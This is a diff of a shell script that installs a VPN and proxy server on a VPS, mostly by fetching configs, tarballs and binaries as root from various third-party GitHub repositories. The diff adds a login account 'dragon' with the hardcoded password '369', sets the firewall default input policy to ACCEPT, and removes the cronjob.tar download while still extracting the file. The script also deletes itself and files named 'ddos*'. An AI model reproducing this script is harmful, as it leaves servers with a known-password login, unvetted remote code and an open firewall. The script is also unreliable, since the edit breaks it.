@@ -120,10 +120,14 @@ wget -O /etc/default/dropbear "https://raw.githubusercontent.com/guardeumvpn/Qwe
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
 
-# squid3
+# Install Squid
 apt-get -y install squid3
-wget -O /etc/squid3/squid.conf "http://raw.github.com/MappakkoE/master/master/squid.conf"
-sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
+cp /etc/squid3/squid.conf /etc/squid3/squid.conf.orig
+wget -q -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/dathai/thaivpn.win/master/api/squid.conf" 
+MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;
+sed -i s/xxxxxxxxx/$MYIP/g /etc/squid3/squid.conf;
+service squid3 restart
+
 # nginx
 apt-get -y install nginx php5-fpm php5-cli
 rm /etc/nginx/sites-enabled/default
@@ -137,23 +141,42 @@ sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php
 # openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget https://github.com/MuluuJelekk/Muluu/blob/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/buchook/00web8/master/iptables.up.rules"
+wget https://raw.githubusercontent.com/sslmode/78/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/Vpaproject/script.sh/master/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 iptables-restore < /etc/iptables.up.rules
 # etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/buchook/00web8/master/client.ovpn"
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/sslmode/78/master/client.ovpn"
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-cd;wget https://raw.githubusercontent.com/buchook/00web8/master/cronjob.tar
 tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
 mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
 chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash nswircz
-echo "nswircz:rzp" | chpasswd
+useradd -m -g users -s /bin/bash dragon
+echo "dragon:369" | chpasswd
 echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
 rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 clear
+
+#Setting USW
+apt-get install ufw
+ufw allow ssh
+ufw allow 1194/tcp
+sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
+sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
+cat > /etc/ufw/before.rules <<-END
+# START OPENVPN RULES
+# NAT table rules
+*nat
+:POSTROUTING ACCEPT [0:0]
+# Allow traffic from OpenVPN client to eth0
+-A POSTROUTING -s 10.8.0.0/8 -o eth0 -j MASQUERADE
+COMMIT
+# END OPENVPN RULES
+END
+ufw enable
+ufw status
+ufw disable
 
 # restart service
 service ssh restart
